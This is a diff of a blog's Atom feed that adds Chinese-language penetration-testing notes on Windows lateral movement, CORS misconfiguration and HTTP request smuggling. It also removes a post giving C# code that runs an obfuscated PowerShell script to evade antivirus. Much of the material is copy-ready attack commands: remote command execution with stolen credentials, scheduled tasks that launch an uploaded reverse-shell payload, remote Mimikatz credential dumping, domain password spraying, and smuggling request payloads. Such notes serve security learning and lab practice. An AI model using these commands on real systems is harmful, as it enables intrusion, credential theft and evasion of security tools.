@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-05-30T02:04:15.616Z</updated>
+  <updated>2020-06-02T03:47:37.129Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,77 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Lateral Movementt</title>
+    <link href="https://github.com/2020/06/02/Lateral-Movementt/"/>
+    <id>https://github.com/2020/06/02/Lateral-Movementt/</id>
+    <published>2020-06-02T03:25:59.000Z</published>
+    <updated>2020-06-02T03:47:37.129Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="PSEXEC"><a href="#PSEXEC" class="headerlink" title="PSEXEC"></a>PSEXEC</h2><p>优点：微软的东东</p><p><strong>执行原理：</strong> </p><ul><li><p>通过ipc$连接，释放psexesvc.exe到目标机器</p></li><li><p>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</p></li><li><p>客户端连接执行命令，服务端启动相应的程序并执行回显数据。</p></li><li><p>运行完后删除服务</p></li></ul><p><strong>使用方式：</strong></p><p>1、先建立IPC通道连接，然后直接使用</p><pre><code>net use \\192.168.0.116\ipc$ “password” /user:administratorpsexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    </code></pre><p>2、在psexec的参数中指定账户密码</p><pre><code>psexec.exe \\192.168.0.116 –u administrator –p password  cmd </code></pre><p>-accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框</p><p>-hashes可支持hash密码</p><p><strong>使用psexec最低要求</strong></p><ol><li>远程机器的 139 或 445 端口需要开启状态，即 SMB；</li></ol><ol><li>明文密码或者 NTLM 哈希；</li></ol><ol><li>具备将文件写入共享文件夹的权限；</li></ol><ul><li>能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；</li></ul><ol><li>能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）</li></ol><p>在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec</p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p><strong>执行原理：</strong></p><p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；<br>通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹</p><p><strong>利用条件：</strong></p><ol><li><p>WMI服务开启，端口135，默认开启。</p></li><li><p>防火墙允许135、445等端口通信。</p></li></ol><p><strong>wmic</strong>（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：</p><p>工作组横向：</p><pre><code>wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;</code></pre><p>域内横向：</p><pre><code>wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”</code></pre><p><strong><a href="https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs">wmiexec</a></strong>： </p><p>获取半交互式shell：</p><pre><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password</code></pre><p>在远程系统上执行单条命令：</p><pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;</code></pre><p>在远程系统上执行bat脚本：</p><pre><code>cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat</code></pre><p><strong>使用hash的情况：</strong><br>wce注入hash再进行连接</p><pre><code>wce –s 账号:主机名或域的名字:LM:NTLMcscript //nologo wmiexec.vbs /shell 192.168.0.1</code></pre><p>注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash</p><p><strong>Invoke-WMIMethod</strong>  （powershell自带,执行单条命令）</p><pre><code>$User=&quot;administrator&quot; $Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred</code></pre><p><a href="https://blog.csdn.net/lhh134/article/details/104150949" target="_blank" rel="noopener">其他的利用</a>还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)</p><h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><p>Service Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件</p><pre><code>copy service.exe \\192.168.0.116\admin$\tempsc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;sc \\192.168.0.116 start TestServicesc \\192.168.0.116 delete TestService</code></pre><p>msfvenom生成service exe：</p><pre><code>-f exe-service</code></pre><p>CS生成service exe：</p><pre><code>输出项选择windows service exe</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><a href="https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83%E8%AF%BE%EF%BC%9A%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20%5B%20windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%88%A9%E7%94%A8%20%5D.pdf">计划任务</a></h2><p>win xp/2003 为at命令</p><p>win7+ 为schtasks命令</p><p><strong>利用条件：</strong></p><ol><li><p>目标管理员账户凭据</p></li><li><p>当前机器可正常net use到远程机器</p></li><li><p>目标机器的计划任务服务“Task scheduler”已正常启动</p></li></ol><pre><code>net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享net time \\192.168.0.116###查看目标主机当前时间xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payloadchcp 437  ###如果目标为中文系统，需要先调整字符集schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务</code></pre><p>参数讲解：</p><p>/TN：任务名称</p><p>/TR：任务执行的程序</p><p>/ST：任务执行的时间</p><h2 id="winRM"><a href="#winRM" class="headerlink" title="winRM"></a>winRM</h2><p><strong>Windows Remote Management</strong><br>通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理</p><p><strong>利用条件：</strong></p><ol><li><p>在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。</p></li><li><p>防火墙对5986、5985端口开放。</p></li></ol><p><strong>powershell：</strong></p><p><strong>第一次执行winrm</strong>：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。</p><pre><code>Set-Item WSMan:localhost\client\trustedhosts -value *Restart-Service WinRM</code></pre><p><strong>常用命令：</strong></p><pre><code>Enable-PSRemoting -force   ###需要目标机器开启远程管理Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框</code></pre><p>用户凭证使用：</p><pre><code>$User=&quot;administrator&quot; $Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}</code></pre><p><strong>直接使用mimikatz获取远程机器的账户密码</strong>：(在域中测试成功，工作组没能成功)</p><pre><code>Import-Module ./Invoke-Mimikatz.ps1Invoke-Mimikatz -ComputerName TARGET</code></pre><p><strong>winrs：</strong></p><pre><code>winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shell</code></pre><p><strong>evil-winrm</strong> 可通过用户凭证密码/hash直接获得交互shell</p><h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>COM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。</p><p>DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据</p><p><strong>获取DCOM列表</strong></p><pre><code>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication或Get-CimInstance Win32_DCOMApplication  #需win12以上</code></pre><p>存在某些具有命令执行功能的DCOM，可用于横向移动</p><p><strong>MMC20.Application COM</strong>：（域中测试成功，工作组只能本地成功而不能远程）<br>查看该DCOM信息：</p><pre><code>Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;</code></pre><p>与目标建立连接：</p><pre><code>$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))$com.Document.ActiveView | Get-Member</code></pre><p>通过ExecuteShellCommand执行程序：</p><pre><code>$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)</code></pre><p><strong>Excel.Application</strong></p><p><a href="https://github.com/outflanknl/Excel4-DCOM">自动化脚本</a></p><p>##<a href="https://github.com/dafthack/DomainPasswordSpray"> Password Spraying</a> ##</p><p>Password Spraying实际上是域用户爆破</p><p>首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值</p><p>自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证</p><pre><code>Import-Module .\DomainPasswordSpray.ps1 Invoke-DomainPasswordSpray -Password password</code></pre><p><strong>其他可选参数：</strong></p><p>UserList-用于Spraying的用户列表。 如果未指定，将自动生成。</p><p>password-用于Spraying的单个密码。</p><p>PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）</p><p>OutFile-输出结果到指定文件</p><p>domain-要对其进行Spraying的域。</p><p>Force-强制喷Spraying继续进行而不提示确认</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p><strong><a href="https://github.com/0xthirteen/SharpRDP">sharpRDP</a></strong>：<br>SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456</p><p><strong>CS中实现：</strong></p><p><img src="1.png" alt=""></p><p><strong>基于tscon的RDP会话劫持</strong><br><a href="https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/" target="_blank" rel="noopener">https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/</a></p><p><a href="https://pentestlab.blog/tag/rdp-session-hijacking/" target="_blank" rel="noopener">https://pentestlab.blog/tag/rdp-session-hijacking/</a></p><p><a href="https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement</a></p><h2 id="PTH-amp-PTT-amp-OverPTH"><a href="#PTH-amp-PTT-amp-OverPTH" class="headerlink" title="PTH&amp;PTT&amp;OverPTH:"></a>PTH&amp;PTT&amp;OverPTH:</h2><p>没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。</p><p>当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权</p><p>需要设置为1，非内置的sid为500的用户才能进行远程连接</p><p>不会影响本地Administrators组中的域帐户，仅影响本地帐户</p><pre><code>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></pre><p><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a></p><h2 id="printers-open-webroots-good-old-Tomcat"><a href="#printers-open-webroots-good-old-Tomcat" class="headerlink" title="printers, open webroots, good old Tomcat"></a>printers, open webroots, good old Tomcat</h2><p>还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境</p><p>链接：</p><p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f</a></p><p><a href="https://lengjibo.github.io/LateralMovement/" target="_blank" rel="noopener">https://lengjibo.github.io/LateralMovement/</a></p><p><a href="https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/" target="_blank" rel="noopener">https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/</a></p><p><a href="https://ired.team/offensive-security/lateral-movement" target="_blank" rel="noopener">https://ired.team/offensive-security/lateral-movement</a></p><p><a href="https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/" target="_blank" rel="noopener">https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/</a></p><p><a href="https://my.oschina.net/u/4283892/blog/3307767" target="_blank" rel="noopener">https://my.oschina.net/u/4283892/blog/3307767</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;PSEXEC&quot;&gt;&lt;a href=&quot;#PSEXEC&quot; class=&quot;headerlink&quot; title=&quot;PSEXEC&quot;&gt;&lt;/a&gt;PSEXEC&lt;/h2&gt;&lt;p&gt;优点：微软的东东&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;执行原理：&lt;/strong&gt; &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CORS配置不当学习</title>
+    <link href="https://github.com/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/"/>
+    <id>https://github.com/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/</id>
+    <published>2020-06-02T02:51:29.000Z</published>
+    <updated>2020-06-02T02:58:21.300Z</updated>
+    
+    <content type="html"><![CDATA[<p>CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。</p><h2 id="SOP（Same-origin-policy："><a href="#SOP（Same-origin-policy：" class="headerlink" title="SOP（Same-origin policy：##"></a>SOP（Same-origin policy：##</h2><p>SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象</p><p>同源三要素：</p><ul><li>同域名 </li><li>同协议 </li><li>同端口</li></ul><h2 id="CORS（Cross-origin-Resourse-Sharing"><a href="#CORS（Cross-origin-Resourse-Sharing" class="headerlink" title="CORS（Cross-origin Resourse Sharing"></a>CORS（Cross-origin Resourse Sharing</h2><p>CORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源</p><p>CORS实现：（<a href="https://cloud.tencent.com/developer/article/1467364" target="_blank" rel="noopener">简单请求/非简单请求</a>）</p><p>请求头：</p><pre><code>1、origin,用于说明本次请求来自哪个源（域名+协议+端口）2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段</code></pre><p>响应头：</p><pre><code>1、Access-Control-Allow-Origin(ACAO) 用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*2、Access-Control-Allow-Credentials表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials</code></pre><h2 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h2><p>CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。</p><p>使用burpsuit进行快速验证：</p><p><img src="1.png" alt=""></p><p>访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:</p><p><img src="2.png" alt=""></p><p>也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为<strong>浏览器已经会阻止如下的配置</strong>。</p><pre><code>Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true</code></pre><h2 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a><a href="https://xz.aliyun.com/t/2745#toc-17" target="_blank" rel="noopener">绕过</a>：</h2><ul><li>NULL源</li><li>使用目标域名作为子域名</li><li>…</li></ul><p><strong>CORS与JSONP的比较</strong></p><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p><p>更多学习链接：</p><p>CORS三种攻击场景： <a href="https://xz.aliyun.com/t/4663" target="_blank" rel="noopener">https://xz.aliyun.com/t/4663</a></p><p>CORS安全完全指南： <a href="https://xz.aliyun.com/t/2745" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。&lt;/p&gt;
+&lt;h2 id=&quot;SOP（Same-origin-policy：&quot;&gt;&lt;a href=&quot;#SOP（Same-origin-policy：&quot; class=&quot;headerlink&quot; title=&quot;SOP（Same
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>HTTP Request Smuggling</title>
+    <link href="https://github.com/2020/06/02/HTTP-Request-Smuggling/"/>
+    <id>https://github.com/2020/06/02/HTTP-Request-Smuggling/</id>
+    <published>2020-06-02T02:34:05.000Z</published>
+    <updated>2020-06-02T02:49:19.532Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>HTTP请求走私（HTTP Request Smuggling）</strong></p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突</p><p>HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling<br>如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞</p><p>这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击</p><p><img src="1.png" alt=""></p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>Content-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）</p><pre><code>POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling</code></pre><h2 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h2><pre><code>POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedb---&gt; data长度，十六进制q=smuggling---&gt;data0---&gt;结束符，后接\r\n\r\n</code></pre><h2 id="Keep-Alive"><a href="#Keep-Alive" class="headerlink" title="Keep Alive##"></a>Keep Alive##</h2><p>在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应<br>所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。</p><p>相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户</p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><ul><li>CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</li><li>TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   </li></ul><pre><code>Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked</code></pre><h2 id="漏洞检测-amp-验证-amp-利用"><a href="#漏洞检测-amp-验证-amp-利用" class="headerlink" title="漏洞检测&amp;验证&amp;利用"></a>漏洞检测&amp;验证&amp;利用</h2><p><img src="2.png" alt=""></p><p>需要关闭自动更新Content-Length功能：</p><p><img src="3.png" alt=""></p><p><strong>漏洞检测：</strong></p><pre><code>POST / HTTP/1.1Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked3abcQ</code></pre><p>上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟<br>如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。</p><p><strong>检测TE.CL</strong></p><pre><code>POST / HTTP/1.1Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G</code></pre><p>0终止符后，后端将超时，等待X到达</p><p><strong>两种数据包比较：</strong></p><p><img src="4.png" alt=""></p><p><strong>漏洞验证</strong></p><p><img src="5.png" alt=""></p><p><strong>漏洞利用：</strong>(发包需要多试几次)</p><p>CL.TE:</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G</code></pre><p>TE.CL:</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10</code></pre><p>终止符0后边接 \r\n\r\n</p><p>TE.TE：</p><pre><code>POST / HTTP/1.1Host: ac681fb21e744a6b8007290700200056.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-Encoding: xxx5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10</code></pre><p>多种利用案例<br>靶场：<a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting</a>  </p><p>案例视频讲解： <a href="https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10" target="_blank" rel="noopener">https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10</a></p><p><a href="https://xz.aliyun.com/t/6878" target="_blank" rel="noopener">https://xz.aliyun.com/t/6878</a> —&gt;内含很多利用案例</p><p><a href="https://www.youtube.com/watch?v=kgkRih2MQtU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=kgkRih2MQtU</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a> 内含很多利用案例</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;strong&gt;HTTP请求走私（HTTP Request Smuggling）&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;原理：&quot;&gt;&lt;a href=&quot;#原理：&quot; class=&quot;headerlink&quot; title=&quot;原理：&quot;&gt;&lt;/a&gt;原理：&lt;/h2&gt;&lt;p&gt;HTTP规范提供了
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>邮件伪造</title>
@@ -408,79 +479,6 @@ sudo impacket-smbserver share $(pwd) -smb2s
       
         &lt;p&gt;有时候收集到了账户凭据，但是psexec等方式不能远程执行命令的情况,大家第一个想到的就是runas命令了吧，但是我们都知道在shell中不能运行runas命令，下面给出在powershell中实现runas命令的效果&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;$pass = conv
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>C#底层调用powershell过杀软</title>
-    <link href="https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
-    <id>https://github.com/2020/04/26/CSharp%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8powershell%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
-    <published>2020-04-26T04:30:27.000Z</published>
-    <updated>2020-04-26T04:32:21.948Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。</strong></p><p>国内某数字杀软，会拦截powershell的运行，以前常用的复制powershell到当前目录执行也被拦截，或者修改empire中的特定函数同样被检测到,很多方式不再适用</p><p>从C#中调用</p><p>添加运行powershell需要的程序包：</p><p>C#调用powershell安装system.management.automation.dll：</p><p>管理NuGet程序包-&gt;浏览-&gt;搜索system.management.automation-&gt;选择system.management.automation.dll-&gt;重新生成项目即可</p><pre><code>using System; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Management.Automation.Runspaces; public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Mycode.Exec(); } } public class Mycode { public static void Exec() { string command = System.IO.File.ReadAllText(@&quot;C:\Users\fmc\Desktop\PowerUp.ps1&quot;); RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create(); Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg); rspace.Open(); Pipeline pipeline = rspace.CreatePipeline(); pipeline.Commands.AddScript(command); pipeline.Invoke(); } }</code></pre><p>PS1文件需要适当混淆以过静态查杀</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;strong&gt;这里C#调用只是一个思路，还有很多方式调用powershell以逃避检测，达到免杀效果。免杀注重的还是思路，今天免杀的东西说不定明天就被杀了。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;国内某数字杀软，会拦截powershell的运行，以前常用的复制powershel
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>C内存加载过杀软</title>
-    <link href="https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/"/>
-    <id>https://github.com/2020/04/26/C%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%9D%80%E8%BD%AF/</id>
-    <published>2020-04-26T03:45:03.000Z</published>
-    <updated>2020-04-26T03:49:11.228Z</updated>
-    
